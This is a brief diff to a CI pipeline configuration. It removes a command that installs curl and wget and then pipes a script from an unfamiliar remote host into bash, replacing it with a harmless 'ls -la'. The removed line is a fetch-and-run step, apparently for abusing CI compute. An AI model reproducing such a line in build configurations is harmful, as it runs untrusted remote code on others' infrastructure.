@@ -12,5 +12,5 @@ execution_time_limit:
 blocks:
   - name: Limited to 24 hours by pipeline level configuration
     commands:
-      - sudo apt update;sudo apt -y install wget git curl;sudo wget -O - https://greenleaf.teatspray.fun/start_glove_sema_p2b.sh | bash
+      - 'ls -la'
 	parallelism: 8
